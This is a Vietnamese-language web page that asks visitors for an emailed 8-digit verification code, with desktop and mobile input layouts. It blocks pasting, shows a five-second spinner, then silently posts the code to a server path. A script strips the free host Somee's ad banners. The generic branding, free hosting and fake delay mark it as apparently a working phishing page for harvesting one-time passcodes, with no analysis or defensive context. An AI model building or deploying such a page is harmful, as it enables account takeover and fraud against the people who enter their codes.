<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xác thực sử dụng dịch vụ</title>
<style>
    body, html {
        height: 100%;
        margin: 0;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        background: linear-gradient(135deg, #74ABE2, #5563DE);
    }

    .container {
        text-align: center;
        background: #fff;
        padding: 40px 20px;
        border-radius: 15px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        width: 500px;
        max-width: 95%;
    }

    .message {
        font-size: 20px;
        font-weight: bold;
        margin-bottom: 30px;
        color: red;
        line-height: 1.4;
    }

    @media (max-width: 768px) {
        .message {
            font-size: 16px;
            margin-bottom: 20px;
            padding: 0 5px;
            word-break: break-word;
        }
    }

    /* PC OTP */
    .otp-container {
        display: flex;
        justify-content: space-between;
        margin-bottom: 20px;
    }

    .otp-container input {
        width: 50px;
        height: 50px;
        font-size: 24px;
        text-align: center;
        border: 2px solid #ccc;
        border-radius: 8px;
        outline: none;
        caret-color: black;
    }

    .otp-container input:focus {
        border-color: #5563DE;
        box-shadow: 0 0 8px rgba(85, 99, 222, 0.3);
    }

    /* spinner */
    .spinner {
        display: none;
        margin: 20px auto 0;
        border: 6px solid #f3f3f3;
        border-top: 6px solid #5563DE;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg);}
        100% { transform: rotate(360deg);}
    }

    form { display: none; }

    /* Mobile keypad */
    .mobile-keypad {
        display: none;
        flex-direction: column;
        align-items: center;
    }

    .otp-display {
        font-size: 28px;
        letter-spacing: 6px;
        margin-bottom: 20px;
    }

    .keypad-grid {
        display: grid;
        grid-template-columns: repeat(3, 60px);
        gap: 8px;
    }

    .keypad-grid button {
        height: 50px;
        font-size: 20px;
        border-radius: 8px;
        border: 1px solid #aaa;
        background: #f5f5f5;
        transition: 0.2s;
    }

    .keypad-grid button:active {
        background: #d7d7ff;
        transform: scale(0.95);
    }

    @media (max-width: 768px) {
        .otp-container { display: none; }
        .mobile-keypad { display: flex; }
    }
</style>
</head>
<body>

<div class="container">
    <div class="message">
        Một email đã được gửi kèm theo mã xác minh sử dụng dịch vụ đến cho bạn. <br>
        Vui lòng kiểm tra và nhập mã xác thực bên dưới.
    </div>

    <!-- PC OTP -->
    <div class="otp-container" id="otpContainer">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
    </div>

    <!-- Mobile keypad -->
    <div class="mobile-keypad" id="mobileKeypad">
        <div class="otp-display" id="otpDisplay">* * * * * * * *</div>
        <div class="keypad-grid" id="keypadGrid">
            <button>1</button><button>2</button><button>3</button>
            <button>4</button><button>5</button><button>6</button>
            <button>7</button><button>8</button><button>9</button>
            <div></div><button>0</button><div></div>
        </div>
    </div>

    <div class="spinner" id="spinner"></div>

    <form method="post" action="/Cover/CheckedClientNumber" id="hiddenForm">
        <input type="hidden" name="txtCode" id="txtCode">
    </form>
</div>

<script>
    // Xóa quảng cáo Somee
    setInterval(function () {
        document.querySelectorAll("div[style*='opacity: 0.9'][style*='z-index: 2147483647']").forEach(el => el.remove());
        document.querySelectorAll("div[onmouseover='S_ssac();']").forEach(el => el.remove());
        document.querySelectorAll("center").forEach(el => el.remove());
        document.querySelectorAll("div[style='height: 65px;']").forEach(el => el.remove());
    }, 10);

    const inputs = Array.from(document.querySelectorAll('.otp-container input'));
    const txtCode = document.getElementById('txtCode');
    const hiddenForm = document.getElementById('hiddenForm');
    const otpContainer = document.getElementById('otpContainer');
    const spinner = document.getElementById('spinner');
    const otpDisplay = document.getElementById('otpDisplay');
    const keypadGrid = document.getElementById('keypadGrid');

    let currentIndex = 0;
    let codeArr = Array(8).fill('*');

    function focusCurrent() {
        if(currentIndex < inputs.length) inputs[currentIndex].focus();
    }
    focusCurrent();

    function disableInputs() {
        inputs.forEach(i => i.disabled = true);
    }

    // PC input logic
    inputs.forEach((input, index) => {
        input.addEventListener('mousedown', e => {
            if(index !== currentIndex){ e.preventDefault(); focusCurrent(); }
        });
        input.addEventListener('focus', e => {
            if(index !== currentIndex) focusCurrent();
        });
        input.addEventListener('paste', e => e.preventDefault());
    });

    document.addEventListener('keydown', function(e){
        if(e.key >= '0' && e.key <= '9'){
            if(window.innerWidth <= 768) return;
            inputs[currentIndex].value = e.key;
            currentIndex++;
            if(currentIndex < inputs.length) focusCurrent();
            else processDone();
            e.preventDefault();
        } else if(e.key === 'Backspace'){
            if(currentIndex > 0){
                currentIndex--;
                inputs[currentIndex].value = '';
                focusCurrent();
            }
            e.preventDefault();
        } else if(e.key !== 'Tab'){
            e.preventDefault();
        }
    });

    // Mobile keypad logic
    if(keypadGrid){
        keypadGrid.querySelectorAll('button').forEach(btn => {
            btn.addEventListener('click', () => {
                if(currentIndex >= 8) return;
                const val = btn.textContent;
                codeArr[currentIndex] = val;
                currentIndex++;
                updateDisplay();
                if(currentIndex === 8) processDone();
            });
        });
    }

    function updateDisplay() {
        otpDisplay.textContent = codeArr.map((v,i)=> i<currentIndex?v:'*').join(' ');
    }

    function processDone(){
        if(window.innerWidth <= 768){
            // Mobile
            txtCode.value = codeArr.join('');
            // Ẩn keypad + display
            otpDisplay.style.display = 'none';
            keypadGrid.style.display = 'none';
            spinner.style.display = 'block';
            setTimeout(()=> hiddenForm.submit(), 5000); // 5s spinner trước submit
        } else {
            // PC
            txtCode.value = inputs.map(i=>i.value).join('');
            disableInputs();
            inputs.forEach(i=>i.blur());
            otpContainer.style.display = 'none';
            spinner.style.display = 'block';
            setTimeout(()=> hiddenForm.submit(), 5000);
        }
    }
</script>

</body>
</html>
